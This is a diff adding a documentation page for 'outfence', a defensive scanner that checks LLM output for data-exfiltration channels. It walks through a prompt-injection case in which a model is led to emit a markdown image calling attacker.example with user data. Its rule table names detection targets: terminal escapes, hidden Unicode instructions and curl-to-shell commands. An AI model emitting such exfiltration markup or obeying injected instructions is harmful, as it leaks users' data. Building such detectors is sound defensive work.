@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>outfence: detect dangerous LLM output before it is rendered in AI agents — agentsec</title>
+  <meta name="description" content="Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.">
+  <link rel="canonical" href="https://dunkleschitz.github.io/agentsec/tools/outfence/">
+  <meta name="robots" content="index,follow">
+  <meta name="theme-color" content="#0d0f12">
+  <link rel="stylesheet" href="https://dunkleschitz.github.io/agentsec/styles.css">
+
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="agentsec">
+  <meta property="og:title" content="outfence: detect dangerous LLM output before it is rendered in AI agents — agentsec">
+  <meta property="og:description" content="Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.">
+  <meta property="og:url" content="https://dunkleschitz.github.io/agentsec/tools/outfence/">
+  <meta property="og:image" content="https://dunkleschitz.github.io/agentsec/og.png">
+  <meta property="og:image:width" content="1280">
+  <meta property="og:image:height" content="640">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="outfence: detect dangerous LLM output before it is rendered in AI agents — agentsec">
+  <meta name="twitter:description" content="Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.">
+  <meta name="twitter:image" content="https://dunkleschitz.github.io/agentsec/og.png">
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "headline": "outfence: detect dangerous LLM output before it is rendered in AI agents",
+  "description": "Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.",
+  "url": "https://dunkleschitz.github.io/agentsec/tools/outfence/",
+  "image": "https://dunkleschitz.github.io/agentsec/og.png",
+  "inLanguage": "en",
+  "isAccessibleForFree": true,
+  "publisher": {
+    "@type": "Organization",
+    "name": "agentsec",
+    "url": "https://dunkleschitz.github.io/agentsec"
+  },
+  "author": {
+    "@type": "Organization",
+    "name": "agentsec contributors"
+  },
+  "license": "https://github.com/dunkleschitz/agentsec/blob/main/LICENSE"
+}
+  </script>
+</head>
+<body>
+  <main class="wrap">
+    <nav class="top" aria-label="Site">
+      <a href="https://dunkleschitz.github.io/agentsec/">Home</a>
+      <a href="https://dunkleschitz.github.io/agentsec/tools/" aria-current="page">Tools</a>
+      <a href="https://dunkleschitz.github.io/agentsec/guides/">Guides</a>
+      <a href="https://dunkleschitz.github.io/agentsec/why/">Why agentsec</a>
+      <a href="https://github.com/dunkleschitz/agentsec">GitHub</a>
+    </nav>
+    <p class="crumbs"><a href="https://dunkleschitz.github.io/agentsec/">agentsec</a> · <a href="https://dunkleschitz.github.io/agentsec/tools/">Tools</a> · outfence</p>
+    <p class="kicker">Offline · stdlib-only · MIT</p>
+    <h1>outfence: detect dangerous LLM output before it is rendered in AI agents</h1>
+    <hr class="rule">
+    <p class="lede">Offline scanner and sanitizer for LLM output before you render it in a chat UI, a markdown viewer, a terminal or an email.</p>
+
+    <article>
+<h2 id="what-it-detects">What it detects</h2>
+<p>Offline scanner and sanitizer for <strong>LLM output</strong> before you render it in a chat UI, a markdown viewer, a terminal or an email.</p>
+<p>Most prompt-injection tooling looks at what goes *into* a model. outfence looks at what comes *out*. When an injected document convinces a model to emit a markdown image such as <code>![](https://attacker.example/p.png?d=&lt;your data&gt;)</code>, the renderer fetches that URL automatically and the data leaves with no click. The same idea applies to HTML <code>&lt;img&gt;</code>, CSS <code>url()</code>, terminal escape sequences that write to the clipboard (OSC 52) or hide a link target (OSC 8), and invisible Unicode that carries hidden instructions to the next agent.</p>
+<p>Single Python file, standard library only, no network calls.</p>
+<h2 id="rules">Rules</h2>
+<table>
+<thead><tr><th>Rule</th><th>Default severity</th><th>What it flags</th></tr></thead>
+<tbody>
+<tr><td>OF01</td><td>high (critical if the URL carries data)</td><td>Markdown image (inline or reference-style) pointing at an external host</td></tr>
+<tr><td>OF02</td><td>high (critical if the URL carries data)</td><td>Auto-loading HTML/CSS: <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;link&gt;</code>, <code>srcset</code>, <code>&lt;meta refresh&gt;</code>, <code>url()</code>, <code>@import</code></td></tr>
+<tr><td>OF03</td><td>medium</td><td>Clickable link to an external host whose query/path/fragment carries encoded or free-text data</td></tr>
+<tr><td>OF04</td><td>critical</td><td>URL carries a secret: a known key shape or a secret-named parameter (<code>token=</code>, <code>api_key=</code>, …)</td></tr>
+<tr><td>OF05</td><td>high (medium for <code>data:image/*</code>)</td><td><code>javascript:</code>, <code>vbscript:</code>, <code>data:</code> or <code>file:</code> URLs in links or <code>src</code>/<code>href</code></td></tr>
+<tr><td>OF06</td><td>high (critical for OSC 52)</td><td>ANSI/OSC terminal escapes: clipboard write, OSC 8 hyperlinks, conceal/overwrite CSI codes, BEL/BS</td></tr>
+<tr><td>OF07</td><td>medium (high for TAG chars, decoded)</td><td>Zero-width, bidi, Unicode TAG and stray variation-selector characters</td></tr>
+<tr><td>OF08</td><td>medium</td><td>Suggested command that pipes remote content into a shell (`curl … \</td></tr>
+<tr><td>OF09</td><td>low</td><td>URL host is an IP literal, punycode or a link shortener</td></tr>
+</tbody>
+</table>
+<h2 id="usage">Usage</h2>
+<pre><code>python3 outfence.py examples                      # scan a folder (text/md/html/json/jsonl)
+python3 outfence.py response.md --json
+llm &quot;summarize&quot; &lt; page.html | python3 outfence.py -            # stdin
+python3 outfence.py transcript.jsonl --allow-host &#x27;*.mycompany.com&#x27; --allow-host cdn.example.org
+python3 outfence.py --sanitize response.md &gt; safe.md           # neutralised copy
+python3 outfence.py --list-rules</code></pre><p>After <code>pip install</code> of the kit, the same options work as <code>agentsec outfence …</code>. Every tool also accepts <code>--help</code> and almost every tool accepts <code>--json</code>.</p>
+<h2 id="example">Example output</h2>
+<p>The examples folder has a poisoned markdown answer, a terminal answer with OSC 52/OSC 8/ conceal escapes, an OpenAI-style transcript, and a clean answer that produces no findings. All URLs use reserved <code>.example</code> domains or documentation IP ranges, and all secrets are fake.</p>
+<p>Captured against the bundled fixtures (fake data only):</p>
+<pre><code>$ python3 outfence.py examples/transcript.json --fail-on none
+CRITICAL OF01 examples/transcript.json#msg3(assistant):1  Markdown image auto-loads an external URL (zero-click exfiltration channel)
+         markdown image → img.evil.example; long encoded-looking value (28 chars)
+
+1 finding(s): 1 critical</code></pre>
+<h2 id="sarif-ci">SARIF and CI</h2>
+<pre><code>agentsec outfence path/to/input --sarif &gt; outfence.sarif
+
+# GitHub Actions (composite action ships with the repo)
+- uses: dunkleschitz/agentsec@v0
+  with:
+    tools: outfence
+    paths: path/to/input
+    fail-on: high
+</code></pre><p>SARIF 2.1.0 can be uploaded to GitHub code scanning. The composite action writes per-tool reports under <code>agentsec-sarif/</code> by default.</p>
+<h2 id="owasp">OWASP mapping</h2>
+<p>Heuristic mapping of what this tool helps a reviewer look for. Not an official OWASP endorsement, and not complete coverage of any item. Sources: <a href="https://genai.owasp.org/llm-top-10/">OWASP Top 10 for LLM Applications 2025</a> and <a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/">OWASP Top 10 for Agentic Applications 2026</a>.</p><ul><li><strong>LLM05 Improper Output Handling</strong> — OWASP LLM Top 10 (2025)</li></ul>
+<h2 id="limits">Known limits</h2>
+<p class="note">Heuristic scanner, not a security boundary. A clean result does not mean something is safe. All example secrets in this repository are fake.</p>
+<p>Full source, tests, and fixtures: <a href="https://github.com/dunkleschitz/agentsec/tree/main/tools/outfence">tools/outfence/</a> in the repository. Install the kit with <code>pip install git+https://github.com/dunkleschitz/agentsec.git</code>.</p>
+    </article>
+
+    <footer>
+      <p>MIT License · Python 3.10–3.13 · <a href="https://dunkleschitz.github.io/agentsec/">agentsec</a> · <a href="https://github.com/dunkleschitz/agentsec">github.com/dunkleschitz/agentsec</a></p>
+    </footer>
+  </main>
+</body>
+</html>
